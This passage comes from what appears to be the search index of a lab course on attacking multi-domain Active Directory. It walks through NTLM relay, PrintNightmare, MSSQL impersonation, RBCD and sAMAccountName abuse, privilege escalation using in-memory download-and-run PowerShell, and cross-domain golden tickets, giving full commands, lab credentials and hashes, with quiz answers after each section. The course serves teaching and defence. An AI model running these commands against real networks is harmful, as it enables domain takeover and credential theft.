memory, not into disk. Loading mallicious scripts to disk may trigger Anti-Virus tools, so it's imperative to work only in memory.</p> <p>At this point, the attacker can run mallicious scripts, as long as these scripts do not touch the disk. Let's now escalate our privileges locally, going from the IIS service security context to the SYSTEM security context. This will be done with the 'Invoke-BadPotato.ps1' script:</p> <pre><code>iex(new-object net.webclient).downloadstring('http://192.168.122.2:8081/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1')\nInvoke-BadPotato\n[System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n#you can also experiment with other tools such as Mimikatz\niex(new-object net.webclient).downloadstring('http://192.168.122.2:8081/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command \"sekurlsa::tickets\"\n</code></pre> <p>This way, an attacker is able to escalate its privileges locally, from a service account security context to the SYSTEM security context, having full control over the DC, in this case.</p> <p>Question</p> <p>Why is it necessary to establish a reverse shell instead of using the webshell directly?</p> Answer <p>In order to be able to maintain a session state. If otherwise the attacker would for example bypass AMSI through the webshell, state would not be maintained, so it would be as nothing was bypassed, rendering this attack useless.</p> <p>Question</p> <p>What technique does Invoke-BadPotato use to escalate privileges?</p> Answer <p>Invoke-BadPotato escalates privileges by exploiting Windows services that run as SYSTEM and improperly handle token impersonation. It leverages the Printer Bug to trick a SYSTEM-level process to authenticate to an attacker-controlled named pipe. This will allow the attacker to impersonate the SYSTEM access token and spawn a process with SYSTEM-level privileges. This technique requires the attacker's compromised account to hold the SeImpersonatePrivilege, which is commonly available to service accounts like those used by IIS.</p>"},{"location":"labs/multi-domain-attacks/MSSQL/","title":"MSSQL Misconfiguration Abuse","text":"<p>Microsoft SQL can often be employed in AD environments. MSSQL servers integrate with AD, allowing AD credentials to be used to authenticate to MSSQL databases. There are possible MSSQL misconfigurations that can lead to an Remote Command Execution position for an attacker. </p> <p>In the Network Reconnaissance section, we determined that both KING and CHIEF provide MSSQL services. We can check again with nmap: <pre><code>#MSSQL runs in port 1433\nnmap -Pn -p 1433 -sV -sC 192.168.122.10 192.168.122.5 192.168.122.20 192.168.122.30\n</code></pre></p> <p>We've previously uncovered lily.aldrin user account credentials, from the altair domain. Let's use it to try and access CHIEF's MSSQL instance: <pre><code>#in the mssql scripts dir\npython3 ./mssqlclient.py -windows-auth altair.local/lily.aldrin:ThisIsMyPassword123@chief.altair.local\n</code></pre> This script displays a shell that the attacker can use to interact with the MSSQL server. Executing the command \u201chelp\u201d will display possible commands.</p> <p>In our session, we can first enumerate logins. By executing the \u201cenum_logins\u201d command we can see which logins are possible in the CHIEF MSSQL service: <pre><code>enum_logins\n</code></pre>  We see that there\u2019s the sa user, or sysadmin, the login with highest privileges in the MSSQL server, the BUILTIN\\Users windows group, and two ALTAIR domain members, lily.aldrin and ted.mosby.</p> <p>MSSQL allows users to impersonate others while using the service. This configuration is done manually by administrators and if too permissive, an attacker can abuse them. The mssqlclient script can enumerate impersonation configurations with the \u201cenum_impersonate\u201d command.   <pre><code>enum_impersonate\n</code></pre></p> <p>We can see that impersonation is allowed in this server. User ted.mosby allows lily.aldrin to impersonate him. This way, a user authenticating as Lily can execute commands with Ted\u2019s privileges. We also can see that ted.mosby can impersonate the sa login, thus being able to execute commands with sa privileges. This impersonation misconfiguration allows an attacker to escalate from an unprivileged user to the sa account within the MSSQL server.</p> <pre><code>exec_as_login ALTAIR\\ted.mosby\nexec_as_login sa\n</code></pre> <p>The sa account has enough privileges to enable the 'xp_cmdshell' stored procedure within the MSSQL server. This stored procedure essentially executes arbitrary Windows shell commands through SQL queries. Enabling this procedure will then allow the attacker to execute commands as the MSSQL service account.  <pre><code>enable_xp_cmdshell\nxp_cmdshell whoami\n</code></pre></p> <p>This way, abusing impersonation misconfigurations, an attacker can execute commands remotely under the MSSQL service account security context.</p> <p>Another feature prone to misconfigurations are linked servers. These are relationships established between MSSQL servers that allow MSSQL logins in one server to impersonate other logins in a different server, if a server link is established. We can enumerate links by running:  <pre><code>enum_links\n</code></pre>  We can see that there is a link between CHIEF and KING, and that the ted.mosby login in CHIEF, maps to the sa login in KING. So, by running:</p> <pre><code>exec_as_login ALTAIR\\ted.mosby\nuse_link KING\n</code></pre> <p>The attacker has reached sa privileges in the KING server as well, allowing him to enable the xp_cmdshell stored procedure and reach Remote Command Execution in KING.</p> <p>Question</p> <p>What can administrators do to prevent this type of abuse?</p> Answer <p>Administrators should carefully monitor impersonation permissions within MSSQL servers, not allowing a low-privilege user to impersonate high-privilege accounts, not directly (Lily -&gt; sa), nor through other impersonation capabilities (Lily -&gt; Ted -&gt; sa). Impersonation paths should be carefully configured. Server link configuration should also be carefully configured, not allowing low-privilege users in one instance to impersonate an high-privilege account in another instance, across server links.</p> <p>Question</p> <p>What has the attacker compromised in this attack?</p> Answer <p>The attacker has gained remote command execution on the MSSQL server by abusing impersonation/linked servers and enabling xp_cmdshell, allowing them to execute commands as the MSSQL service account. At this stage, the domain is not compromised.</p>"},{"location":"labs/multi-domain-attacks/NTLMrelaySMB/","title":"NTLM relay","text":"<p>An NTLM relay attack focuses on intercepting NTLM messages sent from a legitimate client trying to access some service, modifying them, and redirecting them to a legitimate server, impersonating the original client. This attack can be perpetrated by an attacker which positions themselves between the server and the client (MITM).</p> <p>This MITM position can be reached through the use of the LLMNR poisoning attack, for example, also addressed in this lab.</p> <p>In order to perpetrate this attack, two terminals will be used. In order to use two terminals, access the \"Attacker2\" machine and execute the following: <pre><code>ip add add 192.168.122.35/24 dev eth0\nssh ubuntu@192.168.122.2\n#introduce ubuntu's password (it's 'ubuntu')\n</code></pre></p> <p>Now, onto the attack. This attack will only work against machines that have SMB signing disabled. To check which machines are vulnerable, execute the following: <pre><code>crackmapexec smb 192.168.122.0/24\n</code></pre> It seems that both MEMBER and CAPTAIN have SMB signing disabled, both being susceptible to this attack.</p> <p>To perpetrate this attack, first change the 'Responder.conf' file content to what can be seen in  Responder.conf.txt. Then, create a file named 'targets.txt' with the contents seen in  targets.txt. Now, in one terminal:</p> <p><pre><code>ntlmrelayx.py -tf targets.txt -socks -smb2support\n#if you see some permission error upon running this script, do the following\nreadlink -f $(which python3)\nsudo setcap cap_net_bind_service=+ep &lt;output from the last command&gt;\n</code></pre> Once the ntlmrelayx.py script is listening for incoming NTLM messages, on a different terminal, start the Responder tool, which will poison legitimate clients through LLMNR, which will result in the client sending NTLM messages to the attacker.</p> <p><pre><code>#in the Responder directory\nsudo -E python3 Responder.py -I ens3\n</code></pre> After waiting for +/- 5 minutes, you should now have relayed authentication from both the Administrator and Hank accounts to the CAPTAIN DC. In order to verify relayed connections, run the following: <pre><code>#in the ntlmrelayx terminal\nsocks\n</code></pre> This command will output connections that can be used through a SOCKS5 proxy. You can now perform a DCSync attack using the Administrator connection, since this account has the necessary permissions to replicate DC data. With the DCSync, you retrieve every domain credential, compromising the domain. For this, use the secretsdump.py script from Impacket, along with the proxychains4 tool, in order to use the SOCKS proxy, and therefore, the Administrator's connection (Do not stop the ntlmrelayx script from running, stop the Responder tool and use that same terminal): <pre><code>sudo -E proxychains4 $(which secretsdump.py) -no-pass -use-vss NORTH/Administrator@192.168.122.10\n</code></pre></p> <p>This way, just by relaying NTLM messages, an attacker is able to compromise the whole domain.</p> <p>Question</p> <p>How was the attacker able to position itself between the client and the server? </p> Answer <p>The MITM position was reached through LLMNR poisoning through the Responder tool. The Responder tool listens for legitimate LLMNR requests and issues poisoned replies to clients, indicating that the server that the client wants to access is in fact the attacker machine. This way the attacker can position itself between the client and server.</p> <p>Question</p> <p>What's the role of the SOCKS proxy in this attack?</p> Answer <p>In this attack, the attacker establishes a SOCKS5 proxy on their own machine, bound to the context of the compromised session (Admin/Hank's) by means of a NTLM relay attack. Tools like proxychains then route traffic through this proxy, making it appear as if requests originate from the relayed host. This enables the attacker to directly access internal services\u2014such as dumping credentials with secretsdump.py\u2014using the victim\u2019s authenticated session.</p>"},{"location":"labs/multi-domain-attacks/Network-Reconnaissance/","title":"Network Reconnaissance","text":"<p>An attacker that's able to access a Windows Active Directory network (192.168.122.0 in our case) must first retrieve some information through the network itself.</p> <p>This information is crucial for determining the next steps for the attacker. The attacker will start by assessing which Windows machines are present in the network. Then, it is important to determine which of these machines are Domain Controller's. Other than this information, an attacker may also assess which services are provided by Windows machines, which can provide an attacker with potentially vulnerable entry points.</p> <p>To look for Windows machines in the network, the CrackMapExec tool may be used. Through the tool's SMB module, the attacker can scan the network for Windows machines and retrieve information about them:</p> <pre><code>crackmapexec smb 192.168.122.0/24\n</code></pre> <p>The tool will output different Windows machines that are present in the network. You can identify the different Windows machines' hostnames, IP addresses, and domains, and whether they're using SMBv1 or not, as well as if they have SMB signing enabled.</p> <p>Once different machines are identified, the attacker can get to finding out which machines are Domain Controller's, the prime target in AD environments. To do so, the attacker can make use of 2 protocols: DNS and DHCP. DNS is imperative in any AD domain, and can be used to find services hosted exclusevely by DCs. DHCP, on the other hand, isn't required in AD domains but there are DHCP servers running more often than not. Besides providing an IP address, the DHCP server usually indicates the DNS server to clients, so these are able to resolve hostnames. In order to find the DNS server, we'll use nmap and DHCP:</p> <p><pre><code>sudo nmap --script broadcast-dhcp-discover\n</code></pre> Through the output we can see that the DNS server is hosted at 192.168.122.10. This indicates that the 192.168.122.10 machine can be the DC, but it's not certain since DNS servers can be hosted on machines other than DCs. However, there are services that only DCs provide like Kerberos and LDAP. Thus, in order to confirm the DC's IP address, the attacker can lookup Kerberos/LDAP service records in order to assess which machine provides such services:</p> <pre><code>nslookup -type=srv _ldap._tcp.dc._msdcs.north.altair.local 192.168.122.10\nnslookup -type=srv _kerberos._tcp.dc._msdcs.north.altair.local 192.168.122.10\n</code></pre> <p>It seems that both LDAP and Kerberos are provided by CAPTAIN (192.168.122.10), confirming that the CAPTAIN machine is our north.altair.local DC.</p> <p>The attacker can then scan the network for services provided by the different machines. This services can be misconfigured or present some vulnerability, which the attacker can take advantage of.</p> <pre><code>nmap -Pn -p- -sC -sV -oA full_scan 192.168.122.10,20,30,5\n</code></pre> <p>This command may take a while. The output shows us different services running on these machines.</p> <p>Question</p> <p>How many Windows machines are in the network? What about domains?</p> Answer <p>There are 4 Windows machines: MEMBER, CAPTAIN, CHIEF and KING. There are 3 domains: sirius.local, altair.local and north.altair.local</p> <p>Question</p> <p>Why is that the attacker should query certain service records instead of assuming the DNS server's IP address is the DC's IP address?</p> Answer <p>Because the DNS service may be hosted elsewhere, while the Kerberos and LDAP services are hosted by DCs exclusively</p> <p>Question</p> <p>Is the Microsoft SQL service present on any machine? Which ones? What about the IIS service? Can you find any HTTP endpoint that's reachable on any machine?</p> Answer <p>Yes, the MSSQL service is provided by both CHIEF and KING. There's an HTTP enpoint at CAPTAIN named \"Simple Uploader\".</p>"},{"location":"labs/multi-domain-attacks/PrintNightmare/","title":"PrintNightmare Attack","text":"<p>In this attack, the Print Spooler service will be abused. This service used to allow users to upload their own printer drivers to enable easy network printer sharing. A printer driver is a software component that basically acts as a translator between computers and printers. These drivers could be uploaded by users to machines running the Print Spooler service, and the dangerous part is that the Print Spooler service runs as SYSTEM. Meaning that printer drivers are run as SYSTEM as well.</p> <p>An attacker could then upload mallicious code disguised as a printer driver to a machine running the vulnerable service. </p> <p>The Print Spooler service runs on DCs by default. An attacker can then potentially upload a printer driver that creates a new user and adds this user to the local administrators group. And as simple as that, the attacker would then have administrative privileges on the DC itself.</p> <p>To execute this attack, we can first assess if CAPTAIN provides the Print Spooler service: <pre><code>crackmapexec smb 192.168.122.10 -M spooler\n</code></pre></p> <p>Lucky for us, the CAPTAIN DC does provide the vulnerable service. Now, create a file named 'pnightmare.c' inside the 'pnightmare' directory, with the contents seen in pnightmare.c. This code will create a user called 'printersplitter' with password 'Passw0rd' and add the user to the local administrators group.</p> <p>Now, compile the code, start an SMB share so that the DC can retrieve the driver, and finally trigger the DC to retrieve the driver: <pre><code>x86_64-w64-mingw32-gcc -shared -o pnightmare.dll pnightmare.c\nsudo -E python3 /home/ubuntu/.local/bin/smbserver.py -smb2support ATTACKERSHARE . &amp; \n#press ENTER\npython3 CVE-2021-1675.py north.altair.local/skyler.white:'Password123'@captain.north.altair.local '\\\\192.168.122.2\\ATTACKERSHARE\\pnightmare.dll'\n</code></pre></p> <p>Now the attacker holds new administrative credentials, and can use them to dump domain user's hashes, for example, compromising every single user account: <pre><code>crackmapexec smb captain.north.altair.local -u printersplitter -p 'Passw0rd' --ntds\n</code></pre></p> <p>Question</p> <p>Which Windows service is being targetted by the PrintNightmare attack?</p> Answer <p>The Print Spooler service, namely, the fact that it allowed users to upload arbitrary printer drivers.</p> <p>Question</p> <p>Under which security context can attacker code be executed through this attack?</p> Answer <p>Through the PrintNightmare attack, an attacker can execute code under the SYSTEM security context.</p> <p>Question</p> <p>Which method from the Spooler service does the attacker use to upload this arbitrary driver to the DC?</p> Answer <p>RpcAddPrinterDriverEx is abused to make the DC retrieve and install a malicious driver DLL from the attacker\u2019s SMB share.</p>"},{"location":"labs/multi-domain-attacks/RBCDAbuse/","title":"RBCD Abuse","text":"<p>We've seen how both unconstrained and constrained delegation can be abused in this guide. Misconfigured Resource-Based Constrained Delegation can also be abused. Misconfigurations include allowing a low-privileged user to hold delegation rights to sensitive services, much like what happens in the Constrained Delegation Abuse section.</p> <p>Let's take a look at which delegation rights are set in the domain, and see if some low-privileged user can delegate tickets to sensitive services: <pre><code>findDelegation.py NORTH.ALTAIR.LOCAL/skyler.white:Password123 -target-domain north.altair.local\n</code></pre></p> <p>We see that saul.goodman can delegate tickets to any service hosted by MEMBER. This means that the user can impersonate any other user while accessing this server, through means of the S4U2User and S4U2Proxy extensions. Fortunately for us, we've been able to retrieve this user's credentials from its own user account description attribute that the user forgot to delete. Now, we can use Saul's credentials and access the MEMBER CIFS service as the administrator, for example, compromising the MEMBER machine.</p> <pre><code>#retrieve a ticket for the CIFS service in member as the administrator\ngetST.py -spn 'CIFS/member' -impersonate Administrator -dc-ip '192.168.122.10' 'north.altair.local/saul.goodman:beTTer2caLL2me'\n#set the krb5ccname environment var to the new ccache file\nexport KRB5CCNAME=/home/ubuntu/Administrator.ccache\n#use the ticket to access the domain controller through a shell as the administrator\nwmiexec.py -k -no-pass north.altair.local/administrator@member\n#now you've gained access to the MEMBER machine and can execute commands through the CIFS service\nwhoami\n</code></pre> <p>Question</p> <p>What is the risk of misconfigured RBCD?</p> Answer <p>If a low-privileged account is granted delegation rights to a sensitive machine, it can abuse Kerberos extensions (S4U2Self + S4U2Proxy) to impersonate any user, including domain administrators, when authenticating to that machine, and access any service. This effectively lets the attacker gain privileged access without needing the admin\u2019s password or hash.</p> <p>Question</p> <p>Which is the most granular type of delegation between Constrained and RBCD?</p> Answer <p>Constrained delegation is more granular, since in CD, an administrator determines to which specific services a service can delegate tickets to. In RBCD, a service account defines which other accounts can delegate tickets to it. The service account may host many different services, and RBCD allows delegation to any of these, while CD would only allow delegation to specific services.</p>"},{"location":"labs/multi-domain-attacks/SAMAccountNameSpoofing/","title":"SAMAccountNameSpoofing","text":"<p>This attack revolves around tricking the KDC into thinking an account different from the DC is actually the DC account. This way, an attacker can impersonate a DC in a S4U2Self Kerberos extension and retrieve highly privileged service tickets for any DC service.</p> <p>To perpetrate this attack, one must use previously retrieved user credentials, and this user must be able to create a computer account. Users can create up to 10 computer accounts in AD by default. The attacker can check how much computer accounts they can create using CME: <pre><code>crackmapexec ldap captain.north.altair.local -u skyler.white -p Password123 -d north.altair.local -M MAQ\n</code></pre> It seems that Skyler can create up to 10 computer accounts. Let's create a new one: <pre><code>addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host captain.north.altair.local -domain-netbios NORTH 'north.altair.local/skyler.white:Password123'\n</code></pre> Now, the attacker has access to this new account as well. Each account can modify its own SPNs. In this attack, it's necessary to clear out every SPN associated with the newly created account before changing its name: <pre><code>#in the krbrelayx dir\npython3 addspn.py --clear -t 'samaccountname$' -u 'north.altair.local\\skyler.white' -p 'Password123' 'captain.north.altair.local'\n</code></pre></p> <p>Now, we'll rename the computer account's name to the DC's computer account name, without a trailing '$'. Then, we'll retrieve a TGT that will reference this new name. Once we get the TGT we'll change the computer account name back to its original:</p> <pre><code>#in the samaccountname_scripts dir\npython3 ./renameMachine.py -current-name 'samaccountname$' -new-name 'CAPTAIN' -dc-ip 'captain.north.altair.local' north.altair.local/skyler.white:Password123\ngetTGT.py -dc-ip 'captain.north.altair.local' 'north.altair.local'/'CAPTAIN':'ComputerPassword'\npython3 ./renameMachine.py -current-name 'CAPTAIN' -new-name 'samaccountname$' -dc-ip 'captain.north.altair.local' north.altair.local/skyler.white:Password123\n</code></pre> <p>Now, the attacker can use this TGT and confuse the KDC into believing that the TGT actually belongs to the DC computer account. The attacker can then impersonate the DC in order to obtain a service ticket to a DC service as any user. The attacker will then retrieve a service ticket to the SMB service for the administrator user, and then use this ticket to compromise the domain through a DCSync attack using the secretsdump.py script.</p> <pre><code>export KRB5CCNAME=/home/ubuntu/samaccountname_scripts/CAPTAIN.ccache\npython3 ./getST.py -self -impersonate 'administrator' -altservice 'CIFS/captain.north.altair.local' -k -no-pass -dc-ip 'captain.north.altair.local' 'north.altair.local'/'CAPTAIN'\n#now we have a service ticket impersonating the administrator to the DC's SMB service. At this point the domain can be compromised\nexport KRB5CCNAME=/home/ubuntu/samaccountname_scripts/administrator@CIFS_captain.north.altair.local@NORTH.ALTAIR.LOCAL.ccache\nsecretsdump.py -k -no-pass -dc-ip 'captain.north.altair.local' @'captain.north.altair.local'\n</code></pre> <p>Question</p> <p>How can the attacker retrieve a service ticket to the DC's SMB service as the Administrator? Through what mechanism?</p> Answer <p>The attacker retrieves this ticket using the S4U2Self mechanism, which the DC account is allowed to perform. The attacker makes the KDC believe that it holds a TGT pertaining to the DC, and thus it is eligible to execute the S4U2Self and retrieve a service ticket to a DC service, while impersonating the administrator.</p> <p>Question</p> <p>How did the attacker tricked the KDC into believing that the TGT that the attacker holds actually pertains to the DC?</p> Answer <p>By first changing a owned computer account name to CAPTAIN (without a $ at the end). Asking for a TGT, which will reference the CAPTAIN account, and then changing the account name back to the original. Finally, use the TGT, and since there's no CAPTAIN account, the KDC believes the TGT actually belongs to CAPTAIN$, which is the DC's computer account.</p>"},{"location":"labs/multi-domain-attacks/Trust-Reconnaissance/","title":"Trust Reconnaissance","text":"<p>We've previously took a look at which trust relationships are established in this environment using LDAP, but we'll take a look at that again here. Trusts allow users from one domain to access resources in another. If misconfigured or too permissive, attackers can move laterally across domains.</p> <p>Trust relationships are established between different domains in AD in order to allow cooperability between trusting and trusted domains. For an attacker, trust relationships can open ways to compromise even more domains once a single domain has been compromised.</p> <p>To enumerate established trust relationships, an attacker only needs valid credentials:</p> <pre><code>ldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.10 trusts\nldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.20 trusts\nldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.30 trusts\n</code></pre> <p>This way, the attacker assesses that there's a trust relationship between north and altair, as well as a different trust relationship between altair and sirius.</p> <p>Other than which trust relationships are established, an attacker can assess cross-domain access. These are cases in which for example, there's a user from sirius that's part of a group on the north domain. This indicates that this user has a cross domain presence, indicating that it might be an high-value target for an attacker, since it possibly has higher privileges when compared to regular users, as well as being able to access objects across different domains.</p> <p>We previously identified Holly Flax, an HR employee from the sirius domain, as a potential cross-domain user (Authenticated AD Reconnaissance section). This indicates that Holly might have a presence in different domains, as well as having access to sensitive employee information across domains. BloodHound helps visualize attack paths and privileged group memberships across domain boundaries, which is perfect for spotting users with broad access, like Holly. If you haven't performed the commands in the 'BloodHound' section of the lab, please do, and come back to perform further steps.</p> <p>First, head for the search bar on the top-left corner of the BH GUI. Then search for HOLLY.FLAX. You should see a node representing holly. Click the node. Now, to your right, there\u2019s all different kinds of information related to the holly.flax user account. We are interested in looking for different group memberships, since groups are used to grant permissions to different entities in an easier way, such as Human Resources workers. By clicking the \u201cMemberOf\u201d menu, the GUI presents us with different groups that Holly is part of, including nested groups. At this point, we can clearly see that Holly is part of the Human Resources Group both in the sirius.local domain as well as in the north.altair.local domain. This tells us that the account has permissions on both these domains, and can probably have access to sensitive shares containing employee information.</p> <p>As an attacker, we should try and compromise this account, not only potentially gaining access to sensitive information in one but at least two different domains. Access to sensitive information and cross-domain presence with one stone!</p> <p>Question</p> <p>What are Active Directory trust relationships and why are they relevant to attackers?</p> Answer <p>Trust relationships link domains together so that users in one domain can access resources in another. For attackers, these relationships can be abused to move laterally and expand access once a single domain is compromised.</p> <p>Question</p> <p>What is cross-domain access and why does it make certain accounts more valuable?</p> Answer <p>Cross-domain access occurs when a user from one domain has group memberships or privileges in another domain. These accounts are more valuable because they can access resources across multiple domains and may hold higher privileges.</p> <p>Question</p> <p>How does BloodHound help attackers identify valuable cross-domain users?</p> Answer <p>BloodHound maps group memberships and trust paths across domains. By inspecting a user node, attackers can see which groups the user belongs to, including in other domains, highlighting accounts with broad access.</p>"},{"location":"labs/multi-domain-attacks/Trustpocalypse/","title":"Trustpocalypse","text":"<p>The Trustpocalypse attack illustrates how an attacker can navigate from one domain to others very easily, once a single domain has been compromised.</p> <p>Throughout this lab, we've seen multiple ways of compromising the north domain. Recall one of them in order to retrieve the krbtgt account's hash, which is needed in this attack.</p> <p>With the krbtgt's account hash, we can forge golden tickets, as seen in the 'Golden Tickets' section of this lab. What if I told you that with this hash we can also forge tickets with admin access on other domains? This way, by compromising a single domain (which isn't an easy task, don't get me wrong), an attacker can then easily (yes, then it's easy) compromise other trusting entire domains.</p> <p>This can be done through the SID history mechanism in AD. Basically, the attacker can add the Enterprise Admins SID to the forged ticket, granting the attacker Enterprise Admin privileges (Admin Privileges in every domain of the forest). This way, the attacker can compromise other domains. This is only possible in trusts that do not enforce SID filtering, which is the case of intra-forest trusts by default, which in our lab, is established between the NORTH and the ALTAIR domain. This allows this kind of SID injection to succeed.</p> <p>First, the attacker needs to find which are the SIDs that will be needed for this process. Its own domain SID, as well as the Forest Root domain SID (altair's SID in our case): <pre><code>#These commands are here used with an admin hash, please retrieve your hash and replace it in these commands. Through other attacks we were able to retrieve the admins hash. If you dont have the hash, go back to these attacks and retrieve it\nlookupsid.py -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -domain-sids north.altair.local/Administrator@192.168.122.20 0 #altair.local domain SID\nlookupsid.py -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -domain-sids north.altair.local/Administrator@192.168.122.10 0 #north.altair.local domain SID\n</code></pre></p> <p>Now we have the required SIDs to this attack. To get the EA SID, we just need to add -519 at the end of altair's domain SID.</p> <p>Now, we can build a TGT that includes the EA SID, and thus we\u2019ll have full administrator access in altair, from the north domain. For that, we\u2019ll use the 'ticketer.py' script from Impacket. To use the 'ticketer.py' script, we\u2019ll need the krbtgt account\u2019s NT hash. Retrieve it using 'secretsdump.py' script with the admin hashes. Then, retrieve the NT hash and use it in the script.</p> <pre><code>#get the krbtgt account hash\nsecretsdump.py north.altair.local/administrator@192.168.122.10 -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86\n#[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:640464e963ce78864650de778a6b9c31:::\n\n#The -domain-sid argument is the sid from the current domain, north. then the -extra-sid argument is the EA SID, the altair's SID + -519\nticketer.py -nthash 640464e963ce78864650de778a6b9c31 -domain-sid S-1-5-21-1162943719-2261011477-1519509434 -domain north.altair.local -extra-sid S-1-5-21-1073456172-1737515156-949376640-519 berntheman\nexport KRB5CCNAME=/your/dir/berntheman.ccache\nsecretsdump.py -k -no-pass -just-dc-ntlm north.altair.local/berntheman@chief.altair.local\n</code></pre> <p>Et voil\u00e0, we've compromised a trusting domain with a single ticket, which we can forge since we've compromised the trusted domain. On one sweep, an entire domain is compromised. Very scary.</p> <p>Question</p> <p>Can inter-forest trusts be attacked in this manner? Explain the mechanism that prevents it.</p> Answer <p>No, not by default. By default inter-forest trusts have SID filtering enabled. The SID filtering mechanism filters out SIDs that do not pertain to the domain from which the ticket is being sent from. This means that, in the case of this attack, if SID filtering was enabled, the attacker could not use a ticket that held the EA SID since this specific SID pertains to the altair domain, and not the north domain. Only SIDs from north would not be filtered by the SID filtering mechanism.</p> <p>Question</p> <p>Why was the SID history mechanism implemented?</p> Answer <p>The SID history mechanism was implemented to simplify the migration of users or computers between domains. When a security principal moves from one domain (like north) to another (altair, for example), their SID changes because part of the SID is the domain SID. Access to resources is controlled by ACLs tied to specific SIDs, so without SID history, admins would need to manually reconfigure permissions on all resources the user previously accessed \u2014 a tedious task. With SID history, the migrated account retains its old SID in its authentication token, allowing it to access resources in the old domain without modifying any ACLs.</p>"},{"location":"labs/multi-domain-attacks/lab-setup/","title":"Lab setup","text":"<p>The lab experiments will be performed using GNS3. The network scenario for the multi-domain environment experiments is shown in Figure 1. </p> <p></p> <p>CAPTAIN and MEMBER are both custom Windows Server 2016 appliances, while KING and CHIEF are Windows Server 2022 appliances. These appliances' templates are pre-configured for receiving commands through Ansible. You can choose between using Windows appliances with GUI (heavier on resources), or without a GUI (lighter on resources). The lab's Ansible script is expecting you to have GUIs on either all machines or none of them.</p> <p>Choose the .zip file containing the files required for your case. If you choose to use GUIs on Windows machines, download ADLab-MultiDomain-GUI.zip. If you choose to not have GUIs on Windows machines, download ADLab-MultiDomain-NoGUI.zip.</p> <p>Now, to import the GNS3 .qcow2 files to be used as GNS3 templates, do the following: </p> <ul> <li>Open GNS3</li> <li>Go to Edit -&gt; Preferences -&gt; Qemu VMs</li> <li>Press \"New\"</li> <li>The Name of the template must be given according to the GUI choice. If you opted for the no GUI option, the name must be \"custom_windows_NoGUI\" in case the .qow2 file pertains to Windows Server 2016. If the file pertains to Windows Server 2022 template, the name must be \"custom_windows_NoGUI2022\". If you opted for the GUI option, the name must be \"custom_windows\", for Windows Server 2016, or \"custom_windows2022\" for Windows Server 2022 . Do not give a different name to the template.</li> <li>Leave the RAM and Qemu binary fields as is.</li> <li>Set the console type to \"vnc\".</li> <li>In the Disk Image menu, pick \"New Image\".</li> <li>Press \"Browse\" and navigate to the respecive .qcow2 file that you can find in the previsouly mentioned zip file. In this case, if you've opted for no GUI, the files are \"windows_server_2016_NoGUI_AnsibleReady_flat.qcow2\" or \"windows_server_2022_NoGUI_AnsibleReady_flat.qcow2\". Otherwise the correct files are \"windows_server_2016_GUI_AnsibleReady_flat.qcow2\" or \"windows_server_2022_GUI_AnsibleReady_flat.qcow2\".</li> <li>Press \"Finish\"</li> <li>You must have both custom templates ready. One for each OS version. At this point, if you picked the GUI machines, you should have a \"custom_windows\" and a \"custom_windows2022\" template ready to instantiate in GNS3. In case of not using GUI, you should have both the \"custom_windows_NoGUI\" and \"custom_windows_NoGUI2022\" templates ready.</li> </ul> <p>The Orchestrator machine is a docker container. To retrieve this container into a GNS3 template:</p> <ul> <li>Open GNS3</li> <li>In GNS3, go to Edit -&gt; Preferences -&gt; Docker Containers</li> <li>Press \"New\"</li> <li>Select \"Existing image\" and in \"Image Name\" write: \"buzz115/orchestrator:latest\".</li> <li>Confirm the template name is \"buzz115-orchestrator\".</li> <li>Press \"Next\" on every screen and \"Finish\" at the end, keeping default values throughout the rest of the configuration.</li> </ul> <p>Orchestrator contains different Ansible scripts that will be used to setup the lab environment automatically.</p> <p>The Attacker machine is an Ubuntu Cloud Guest appliance. To retrieve it:</p> <ul> <li>Press \"Browse End Devices\", on the left menu (The button that looks like a monitor).</li> <li>Then, press \"New Template\".</li> <li>Choose \"Install an appliance from the GNS3 server (recommended)\", and click \"Next\".</li> <li>Open the \"Guests\" menu. Pick \"Ubuntu Cloud Guest\". Press \"Install\".</li> <li>Choose the server type and the Qemu binary accordingly.</li> <li>Install \"Ubuntu Cloud Guest version Ubuntu 22.04 LTS (Jammy Jellyfish)\"</li> <li>Name the template \"Ubuntu Cloud Guest Ubuntu 22.04 LTS (Jammy Jellyfish)\" exactly.</li> </ul> <p>The Attacker2 machine is a \"Toolbox\" appliance. To retrieve it, follow the same steps presented for the Attacker machine, but instead of choosing \"Ubuntu Cloud Guest\" in the \"Guests\" menu, choose \"Toolbox\". The template must have the name \"Toolbox\".</p> <p>Before proceeding, make sure you:</p> <ul> <li>Have the custom Windows 2016 image available as a GNS3 Template named \"custom_windows_NoGUI\"/\"custom_windows\", as well as the custom Windows 2022 image available as a GNS3 Template named \"custom_windows_NoGUI2022\"/\"custom_windows2022\".  Pick the correct name according to your GUI preference. The template names must have one of these values, otherwise the script that builds the lab will fail.</li> <li>Have the custom docker container available as a GNS3 Template named \"buzz115-orchestrator\". The template name must have this value.</li> <li>Have the Toolbox available as a GNS3 Template named \"Toolbox\". The template name must have this value.</li> <li>Have the specified Ubuntu Cloud Guest image available as a GNS3 Template named \"Ubuntu Cloud Guest Ubuntu 22.04 LTS (Jammy Jellyfish)\". The template name must have this value.</li> </ul> <p>Once the templates are correctly imported to GNS3, run the \"CreateADLab.py\" script. This script is included in the downloaded zip, along with a python module. Both python files must be in the same dir when executing \"CreateADLab.py\". <pre><code>usage: CreateADLab.py [-h] --project PROJECT [--path PATH] [--server-path SERVER_PATH] (--no-gui | --gui) (--single-domain | --multi-domain)\n\n#for a lab with Windows GUIs installed on the machines, run:\npython3 CreateADLab.py --project MyADProject --gui --multi-domain\n\n#for a lab without Windows GUIs installed on the machines, run:\npython3 CreateADLab.py --project MyADProject --no-gui --multi-domain\n</code></pre></p> <p>This script will create the GN3 Lab with the required nodes and links. Once the project is created, open it. Start all devices. Once all devices are turned on, access the Orchestrator machine. At the terminal, head to the respective ansible directory. There are four ansible directories: </p> <ul> <li>One for the multi-domain 